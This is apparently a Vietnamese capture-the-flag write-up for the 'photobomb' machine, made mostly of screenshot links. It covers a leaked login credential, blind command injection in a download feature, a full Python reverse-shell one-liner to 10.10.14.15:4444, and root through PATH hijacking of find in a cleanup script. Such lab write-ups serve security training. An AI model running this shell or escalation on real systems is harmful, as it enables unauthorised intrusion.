# photobomb

![https://lh7-us.googleusercontent.com/OsN54M5VBim4rXCuP3PoYJLp8CvHv_XSKc8qM258yjlaVBlqQ3HQ6oDVOxooEyfFb90YbI-5GEwqUiR0RYr9j8J1slNVhjnIH3V56NYP9DTokFnDuU-rqSUXb_cP28nZWGPr3UoRhext](https://lh7-us.googleusercontent.com/OsN54M5VBim4rXCuP3PoYJLp8CvHv_XSKc8qM258yjlaVBlqQ3HQ6oDVOxooEyfFb90YbI-5GEwqUiR0RYr9j8J1slNVhjnIH3V56NYP9DTokFnDuU-rqSUXb_cP28nZWGPr3UoRhext)

không tìm thấy subdomain

![https://lh7-us.googleusercontent.com/pYVZHBjlgRUwrPoKCYQO66vFRU1W1ER8_hw8MLO3_aNIwQyzqMw3U2qxFpHnsDJU1rxLL1mCTCzI48wwE7FztFvRrJBHRoO73O3UE9WrW3u_WqKfGx39qKAXM0g60Ek1x1yp4gkfLFlh](https://lh7-us.googleusercontent.com/pYVZHBjlgRUwrPoKCYQO66vFRU1W1ER8_hw8MLO3_aNIwQyzqMw3U2qxFpHnsDJU1rxLL1mCTCzI48wwE7FztFvRrJBHRoO73O3UE9WrW3u_WqKfGx39qKAXM0g60Ek1x1yp4gkfLFlh)

truy cập p80

![https://lh7-us.googleusercontent.com/4vj5x4q8vBcqE43ICPTBfC371Bj-LAmhG2ilKaRJT3Uz7r60G5WY6oNva1NnfE0ftXnifD3JeK6kkX3bxoshC6dyCBHfCtrP-edrKiEphFhR4O0ebdrILKH7EZN62YbKzPg3AO7uHtZN](https://lh7-us.googleusercontent.com/4vj5x4q8vBcqE43ICPTBfC371Bj-LAmhG2ilKaRJT3Uz7r60G5WY6oNva1NnfE0ftXnifD3JeK6kkX3bxoshC6dyCBHfCtrP-edrKiEphFhR4O0ebdrILKH7EZN62YbKzPg3AO7uHtZN)

/printer

![https://lh7-us.googleusercontent.com/TVlP-N1XtHyxJtUMSCSofEHmPhzOA2-7dp4dTlGvskPHEQnKmo8H-ZdMkizWfh8b6A0COOw2jA7g0fj-QjAk-olljzl2ZVP8GheOUp0bhTLI5FOJpgGJ2tf4Q1e91Fdmjd0PllNVSyXJ](https://lh7-us.googleusercontent.com/TVlP-N1XtHyxJtUMSCSofEHmPhzOA2-7dp4dTlGvskPHEQnKmo8H-ZdMkizWfh8b6A0COOw2jA7g0fj-QjAk-olljzl2ZVP8GheOUp0bhTLI5FOJpgGJ2tf4Q1e91Fdmjd0PllNVSyXJ)

phân tích source code

![https://lh7-us.googleusercontent.com/RrUr4yFNFgt8rbARgzYKvN4R86yOcv0I9DE4ITzEBYGAPdgZWDDr_x9uSpMPHkapjN3S-CD6djplIcrhZy6Ir3X-XJifXATfriFU5WPXaAaLukUbuolaOunlCzfIM_YRkYdu3B3iGnW3](https://lh7-us.googleusercontent.com/RrUr4yFNFgt8rbARgzYKvN4R86yOcv0I9DE4ITzEBYGAPdgZWDDr_x9uSpMPHkapjN3S-CD6djplIcrhZy6Ir3X-XJifXATfriFU5WPXaAaLukUbuolaOunlCzfIM_YRkYdu3B3iGnW3)

tìm thấy credential

![https://lh7-us.googleusercontent.com/eODX-fiQCYGR1J2HivI6DjmlMJSYwa2i189qyXuycbALHbR4_wdeDpfHbLvZLxGHkxTh1kGprJ5m7NR_M2SU5I17tRL3r5Dpf8IwPfUJ7kLWhaEErL8kR2DXAWBrmgoXjBZWFsskzI6H](https://lh7-us.googleusercontent.com/eODX-fiQCYGR1J2HivI6DjmlMJSYwa2i189qyXuycbALHbR4_wdeDpfHbLvZLxGHkxTh1kGprJ5m7NR_M2SU5I17tRL3r5Dpf8IwPfUJ7kLWhaEErL8kR2DXAWBrmgoXjBZWFsskzI6H)

pH0t0 : b0Mb!

đăng nhập /printer

![https://lh7-us.googleusercontent.com/B0LAqPUp3eNGDEgztIkPxVCPUVP9ygbGYaAE3XBJolCA3IuCWSbhnJW8Gx7ujnaZUq1CZ-5CVLgNwYzhXk-7ptwSiB-0juxNDIJgzR7q56FbrnVfamlF0ryIZjkCVz-PFf5l_bB9WOk_](https://lh7-us.googleusercontent.com/B0LAqPUp3eNGDEgztIkPxVCPUVP9ygbGYaAE3XBJolCA3IuCWSbhnJW8Gx7ujnaZUq1CZ-5CVLgNwYzhXk-7ptwSiB-0juxNDIJgzR7q56FbrnVfamlF0ryIZjkCVz-PFf5l_bB9WOk_)

thấy chức năng download có thể bị blind command injection time-based

![https://lh7-us.googleusercontent.com/HL3M9icKsLwR2AKCRHP_KIG-U4cBSfCFiXY0DA6AscsT0sFWI16C77_vAS3HRmZwzHLNjMiHu-VsBD1qsc-6WQBNJKRsAHPkPXmm9aOx_gkZ0F4rNFjhYbLfddgl4FiaNLvu79RIH_iB](https://lh7-us.googleusercontent.com/HL3M9icKsLwR2AKCRHP_KIG-U4cBSfCFiXY0DA6AscsT0sFWI16C77_vAS3HRmZwzHLNjMiHu-VsBD1qsc-6WQBNJKRsAHPkPXmm9aOx_gkZ0F4rNFjhYbLfddgl4FiaNLvu79RIH_iB)

![https://lh7-us.googleusercontent.com/Id652GjOJdtyaVml7crUvHu-IA8grr6iXInX9uU-CmccvWC_wF4Kwy73Khsf9ThlOQYKZN8MR2BEoR4xuP3zJS8wJXvdZWeJL1B9UHxLMQwaS66cqVEGaDsDblcnuELueE9x0Qr5ptmx](https://lh7-us.googleusercontent.com/Id652GjOJdtyaVml7crUvHu-IA8grr6iXInX9uU-CmccvWC_wF4Kwy73Khsf9ThlOQYKZN8MR2BEoR4xuP3zJS8wJXvdZWeJL1B9UHxLMQwaS66cqVEGaDsDblcnuELueE9x0Qr5ptmx)

tạo reverse shell

![https://lh7-us.googleusercontent.com/t0E5Ynr8OoEdQRnPdfPDT4WQA8pBXrXf6RDBEM0xKNGP1o3Rnd17632tcRIzLZh6FvZz6l5cVTI8mUu5pqScpl55laHCEuSh2f0fvB757yy6KYeL8RsYJWcimWg5QrBh1urgX6BjkeK3](https://lh7-us.googleusercontent.com/t0E5Ynr8OoEdQRnPdfPDT4WQA8pBXrXf6RDBEM0xKNGP1o3Rnd17632tcRIzLZh6FvZz6l5cVTI8mUu5pqScpl55laHCEuSh2f0fvB757yy6KYeL8RsYJWcimWg5QrBh1urgX6BjkeK3)

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'

![https://lh7-us.googleusercontent.com/GTD1h8IRUpbUXj7cQR7g_yL3R-wW8AjWYf2Yx7KsmU7DTIo2dXAhCt3yJpf_O_iI69jGrzndIgnh3uXASfsGvW9Wb95J_S8gTJjiOVpcdcKyVlx4sL3QuDrVT_rz5QfWDmmmK9toG5Ne](https://lh7-us.googleusercontent.com/GTD1h8IRUpbUXj7cQR7g_yL3R-wW8AjWYf2Yx7KsmU7DTIo2dXAhCt3yJpf_O_iI69jGrzndIgnh3uXASfsGvW9Wb95J_S8gTJjiOVpcdcKyVlx4sL3QuDrVT_rz5QfWDmmmK9toG5Ne)

![https://lh7-us.googleusercontent.com/R9_6mNnoQe7QuZe5emHSrRtL8rcStBMcDFYlKrQqdddUi23iP2e6pmaE2VkZcoSEC_S_2ZOjhZWGpznBuiCbc5D_myIRDtbY8xIcJTZDkrTsp6tAKZ-vT-9RE8OKf6fIYvnnTJl4D3QY](https://lh7-us.googleusercontent.com/R9_6mNnoQe7QuZe5emHSrRtL8rcStBMcDFYlKrQqdddUi23iP2e6pmaE2VkZcoSEC_S_2ZOjhZWGpznBuiCbc5D_myIRDtbY8xIcJTZDkrTsp6tAKZ-vT-9RE8OKf6fIYvnnTJl4D3QY)

![https://lh7-us.googleusercontent.com/C6yoqnYPPFYTZvOyA-2qtvALVA5kBC7Vz3IQ0MCZvDmKUP1k6uzSDK8kutVpN2yRvZCjiosbxWlTWIv5yqXjEGSw1bgQSyPrdLnGuHVBLj1RShGaqQyIpzrAvyNyTtE1WC1BtW47EPX0](https://lh7-us.googleusercontent.com/C6yoqnYPPFYTZvOyA-2qtvALVA5kBC7Vz3IQ0MCZvDmKUP1k6uzSDK8kutVpN2yRvZCjiosbxWlTWIv5yqXjEGSw1bgQSyPrdLnGuHVBLj1RShGaqQyIpzrAvyNyTtE1WC1BtW47EPX0)

![https://lh7-us.googleusercontent.com/CZmqRbui2eBo0Y0diq75uZJtzhSljyuqBI4rYCenVDtqGMxaUwq3O1KlaFt08KYjI5vFpwjxKhi2lOhdYCXs1RL642z1SymBWxGt9XmVvWMjlx8C7dbmBjjp3Q6ij5LyK6MoozYZiYQP](https://lh7-us.googleusercontent.com/CZmqRbui2eBo0Y0diq75uZJtzhSljyuqBI4rYCenVDtqGMxaUwq3O1KlaFt08KYjI5vFpwjxKhi2lOhdYCXs1RL642z1SymBWxGt9XmVvWMjlx8C7dbmBjjp3Q6ij5LyK6MoozYZiYQP)

nội dung file /opt/cleanup.sh

![https://lh7-us.googleusercontent.com/95fsRICWvJ7K5Jj5mkzgbtsn8HyckDc4aga_QkzWRpEk7sDnXUjl75dznGoMJu7xGLSg8fJ2vP9Vo6yJ8gV2H2jRj71JvPnxGX2bWMd0Ed9f1xLTReek8xo9EABzMXRA_1heo6ioyrY_](https://lh7-us.googleusercontent.com/95fsRICWvJ7K5Jj5mkzgbtsn8HyckDc4aga_QkzWRpEk7sDnXUjl75dznGoMJu7xGLSg8fJ2vP9Vo6yJ8gV2H2jRj71JvPnxGX2bWMd0Ed9f1xLTReek8xo9EABzMXRA_1heo6ioyrY_)

Tập lệnh này đang chuyển sang /home/wizard/photobomb, trong đó với -s nó sẽ kiểm tra xem photobomb.log có tồn tại và kích thước khác rỗng không, với -L và ! nó kiểm tra xem tệp nhật ký có phải là symbolic link hay không, sau đó ghi đè nội dung của photobomb.log lên photobomb.log.old và xóa nội dung của tệp nhật ký, sau đó dùng Find để tìm tất cả các tệp jpg và tạo quyền root làm chủ sở hữu của những hình ảnh đó

lệnh find không được chạy qua đường dẫn tuyệt đối -> có thể lạm dụng nó bằng cách tạo một tệp sẽ sinh ra bash bằng cách đặt các biến môi trường mà qua đó có thể khai thác biến PATH

![https://lh7-us.googleusercontent.com/nBdgXg-qjA0TLPH1cHYSnXAIZ2LJ9lENqaPS1n61EY4horAa-7aiAGSo6at26nwT44ap9iOyhBHLKcWVUYx3YUYnHCbg23i-HM8T2jC4j-x9SlN1rAbYgd7zFEVGPd2CAdlC6T_BJgNx](https://lh7-us.googleusercontent.com/nBdgXg-qjA0TLPH1cHYSnXAIZ2LJ9lENqaPS1n61EY4horAa-7aiAGSo6at26nwT44ap9iOyhBHLKcWVUYx3YUYnHCbg23i-HM8T2jC4j-x9SlN1rAbYgd7zFEVGPd2CAdlC6T_BJgNx)

![https://lh7-us.googleusercontent.com/DW9a2k2gReEGE4jlPqS9M8Ll6hBImjIS8wPTDUaEI2fNqBwfUTdlHj1wQRlbUVcbfjJ8cQQLnsdml8-h6hV5EVBSnZOkMKKs9fR0TAJKRL3n3vkTbiF227LYQasOfMl51y-l9fXS9k1t](https://lh7-us.googleusercontent.com/DW9a2k2gReEGE4jlPqS9M8Ll6hBImjIS8wPTDUaEI2fNqBwfUTdlHj1wQRlbUVcbfjJ8cQQLnsdml8-h6hV5EVBSnZOkMKKs9fR0TAJKRL3n3vkTbiF227LYQasOfMl51y-l9fXS9k1t)